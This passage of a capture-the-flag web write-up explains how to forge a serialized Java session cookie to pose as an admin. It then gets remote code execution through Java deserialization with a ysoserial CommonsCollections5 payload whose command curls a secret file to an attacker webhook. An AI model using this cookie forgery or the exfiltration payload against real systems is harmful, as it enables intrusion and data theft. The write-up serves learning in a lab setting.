+<p>The <code>extractSecretForumlaFromSafeBox()</code> method reads the content of the <code>secretformula_for_plankton.txt</code> that content is rendered later in the <code>/secretformula</code> route. That file actually contain a fake flag, i did know that from the source code i downloaded. You will get two files:  </p>
+<ol>
+<li><code>secretformula_for_plankton.txt</code> &#x3D;&gt; contain the fake flag.  </li>
+<li><code>secretformula.txt</code> &#x3D;&gt; contain the real flag.</li>
+</ol>
+<p>Okay, to access the <code>/secretformula</code> route, we need to use <code>Admin@admin.com</code> email. If you just use that in the login page, it will fail. In the code there is that line:</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">email</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;email&quot;</span>).toLowerCase();</code></pre></div>
+<p>The code is simply takes the email parameter and turn it into lowercase, so we need to modify a cookie and assign the <code>Admin@admin.com</code> email into it.  </p>
+<p>To do that, i made a simple java code that generate arbitrary cookie and used it in an online compiler.  </p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
+<span class="hljs-keyword">import</span> java.io.Serializable;
+<span class="hljs-keyword">import</span> java.util.Base64;
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;
+    <span class="hljs-keyword">private</span> String email;
+    <span class="hljs-keyword">private</span> String name;
+    <span class="hljs-keyword">private</span> String password;
+    <span class="hljs-keyword">private</span> String lastIp;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String email, String name, String password, String ip)</span>&#123;
+        <span class="hljs-built_in">this</span>.email = email;
+        <span class="hljs-built_in">this</span>.name = name;
+        <span class="hljs-built_in">this</span>.password = password;
+        <span class="hljs-built_in">this</span>.lastIp = ip;
+    &#125;
+
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEmail</span><span class="hljs-params">()</span> &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.email;
+    &#125;
+
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;
+    &#125;
+
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getLastIp</span><span class="hljs-params">()</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.lastIp;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkPassword</span><span class="hljs-params">(String pass)</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password.equals(pass);
+    &#125;
+
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">User</span> <span class="hljs-variable">maliciousUser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Admin@admin.com&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>);
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+        oos.writeObject(maliciousUser);
+        oos.close();
+        <span class="hljs-type">String</span> <span class="hljs-variable">cookieValue</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+        System.out.println(<span class="hljs-string">&quot;cookie:&quot;</span>);
+        System.out.println(cookieValue);
+    &#125;
+&#125;</code></pre></div>
+
+<p>When running the above code, you will get a cookie that you can use on <code>/secretformula</code> route.</p>
+<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20160420.png" srcset="/img/loading.gif" lazyload alt="Fake Flag"></p>
+<p>How we can get the real flag? We need to trigger an RCE through a deserialization attack.</p>
+<p>I used the <code>ysoserial-all.jar</code> tool for that exploit and the <code>CommonsCollections</code> library, assuming the server using it because it’s very common. I also noticed we can’t cat the flag, so we need to send it remotely. </p>
+<p>The final command will be like this:<br><code>java -jar ysoserial-all.jar CommonsCollections5 &quot;curl &lt;WEBHOOK&gt; -d @/safebox/secretformula.txt&quot; &gt; test.bin</code> then base64 the resulted file by: <code>base64 -w 0 test.bin</code>. </p>
+<p>Then you will get a cookie you can use. The server will deserialize the cookie, read the <code>secretformula.txt</code> which contain the real flag and send it to our webhook</p>
+<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20162440.png" srcset="/img/loading.gif" lazyload alt="Flag"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/06/htb-m/environment/" title="HTB Environment Machine (Medium)">
+                        <span class="hidden-mobile">HTB Environment Machine (Medium)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
